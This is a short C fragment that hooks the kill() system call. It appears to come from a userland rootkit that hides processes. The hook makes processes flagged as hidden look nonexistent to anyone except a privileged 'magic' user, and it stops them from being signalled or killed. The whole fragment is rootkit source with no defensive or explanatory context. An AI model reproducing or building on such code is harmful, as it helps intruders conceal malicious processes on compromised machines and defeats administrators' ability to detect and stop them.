int kill(pid_t pid, int sig){
    if(!magicusr() && hidden_proc(pid)){
        errno = ESRCH;
        return -1;
    }
    hook(CKILL);
    return (long)call(CKILL, pid, sig);
}